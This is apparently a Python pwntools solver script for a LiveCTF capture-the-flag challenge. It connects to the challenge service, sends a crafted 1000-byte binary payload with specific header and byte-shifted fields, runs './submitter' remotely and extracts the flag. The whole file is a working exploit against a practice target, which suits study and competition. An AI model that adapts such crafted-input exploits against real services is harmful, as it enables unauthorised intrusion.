#!/usr/bin/env python3

from pwn import *
import os

HOST = os.environ.get("HOST", "localhost")
PORT = 31337

r = remote(HOST, int(PORT))

def sub(x, y):
    return bytes(z + y & 0xFF for z in x)

payload = flat(
    {
        0: [b"ABCD", p16(1), p32(0x11223344)],
        10: [p8(4), b"fUzZ\x00tHiS"],
        20: sub(flat([p8(0x80), p32(0x80000000) * 2, p8(0)]), 1),
        30: sub(flat([p8(64), p32(0), '1337']), 2),
        40: sub(flat([p8(16), bytes([0b01010101]*8)]), 3),
        # 999: b"\n",
    }
)

payload += b'\x00' * (1000 - len(payload))
r.sendline(payload)
r.recvline()
# r.sendline("\r\n")

r.sendline("./submitter")
flag = r.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)